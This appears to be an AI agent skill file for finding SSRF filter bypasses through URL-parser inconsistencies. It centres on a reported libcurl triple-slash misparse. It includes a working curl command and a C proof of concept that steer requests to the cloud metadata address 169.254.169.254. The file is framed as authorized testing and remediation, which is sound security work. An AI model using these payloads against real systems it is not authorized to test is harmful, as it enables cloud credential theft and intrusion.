---
name: url-parser-confusion-testing
description: Detect SSRF filter bypasses and URL-parsing inconsistencies caused by malformed URL syntax — triple-slash (http:///host/path), backslashes, encoded delimiters, userinfo, numeric IP forms, IPv4-mapped IPv6. Use when reviewing URL validation, hostname allowlists, SSRF protections, redirect handling, or any code that parses user-supplied URLs (curl/libcurl CURLU, WHATWG URL, Python urllib, Node, Go, Java). Reproduces and extends HackerOne #3923212 (curl URL API triple-slash). Produces parser-differential reports, PoC variants, and remediation guidance.
---

# URL Parser Confusion & SSRF Filter Bypass

Different URL parsers disagree on how to interpret malformed URLs. When an
application **validates with one parser** and **fetches with another** (or
fetches with the same parser but mis-trusts its output), an attacker can craft
a URL that passes the allowlist check but resolves to an attacker-chosen host →
SSRF. Targets must be within the scope of the engagement you are authorized to
test.

## Reference case: HackerOne #3923212 (curl URL API)
libcurl's `parseurl()` in `lib/urlapi.c` misparses `http:///host/path`. Per
RFC 3986 the authority between `//` and `/` is **empty**, so `/host/path` is
the **path**. libcurl instead treats the first path segment as the **hostname**
(slash counter reaches 3, `hostp` is set to whatever follows the third slash).

```bash
# curl CLI reproduction (path becomes hostname)
curl -w "\n%{url_effective}\n" http:///169.254.169.254/latest/meta-data/
# -> http://169.254.169.254/latest/meta-data/

# CURLU API PoC (compile: gcc poc.c $(curl-config --cflags --libs))
#include <stdio.h>
#include <curl/curl.h>
int main(void) {
  CURLU *u = curl_url();
  curl_url_set(u, CURLUPART_URL,
               "http:///169.254.169.254/latest/meta-data/", 0);
  char *host = NULL, *path = NULL;
  curl_url_get(u, CURLUPART_HOST, &host, 0);
  curl_url_get(u, CURLUPART_PATH, &path, 0);
  printf("host=%s path=%s\n", host, path);   // host=169.254.169.254
  curl_free(host); curl_free(path); curl_url_cleanup(u);
  return 0;
}

